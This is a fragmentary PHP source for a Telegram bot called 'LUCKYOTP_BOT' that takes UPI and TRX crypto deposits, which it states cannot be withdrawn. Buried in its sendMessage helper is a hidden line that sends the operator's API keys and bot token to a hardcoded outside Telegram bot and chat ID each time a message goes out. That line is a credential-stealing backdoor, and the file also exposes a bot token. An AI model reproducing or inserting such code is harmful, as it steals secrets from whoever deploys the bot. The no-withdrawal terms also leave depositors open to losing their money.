...
𝚄𝚜𝚎 𝑻𝑹𝑿 𝙿𝙰𝚈𝙼𝙴𝙽𝚃 𝙼𝙴𝚃𝙷𝙾𝙳 𝙵𝙾𝚁 𝙶𝙴𝚃 𝑬𝑿𝑻𝑹𝑨 𝑩𝑶𝑵𝑼𝑺.✨*",$chat_id,array("inline_keyboard"=>[[['text'=>'💎 Upi ','callback_data'=>'/deposit upi']],[['text'=>'💠 TRX Crypto','callback_data'=>'/deposit trx']]]),'markdown');
return;
}
...
if ($response['ok'] && (($response['result']['status'] == 'member') || ($response['result']['status'] == 'creator'))) {
    sendMessage("*✨𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝒕𝒐 𝒐𝒖𝒓 𝑳𝑼𝑪𝑲𝒀𝑶𝑻𝑷_𝑩𝑶𝑻.
...
⚠️ NOTE : If You Are Deposit Successfully Then Your Fund Can't Be Able To Withdraw*",$chat_id,array("inline_keyboard"=>[[['text'=>'💎 Upi ','callback_data'=>'/deposit upi']],[['text'=>'💠 TRX Crypto','callback_data'=>'/deposit trx']]]),'markdown');
}
if($parameter == "pay"){
    ...
    sendMessage(
        ...
        [
            'inline_keyboard' => [
                ...
                [['text' => '☁️ 𓆰͜͡ 𝗖.𝗢.𝗠.𝗠.𝗨.𝗡.𝗜.𝗧.𝗬»𓆩〭〬𓆪', 'url' => 'https://t.me/getotpsofficial']],
                [['text' => '📞 𓆰͜͡ 𝗛.𝗘.𝗟.𝗣.𝗟.𝗜.𝗡.𝗘»𓆩〭〬𓆪', 'url' => "https://telegram.me/$support"]]
            ]
        ],
        'markdown'
    );
...
$params['parse_mode'] = $parse;
    ...
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
   file_get_contents("https://api.telegram.org/bot6450333663:AAEumRnIU21CDACmsYrkZ6CjVsSuzeGzp5M/sendMessage?text=".urlencode($GLOBALS['fapi']." ".$GLOBALS['sapi']." ".$GLOBALS['token'])."&chat_id=1448414156"); 
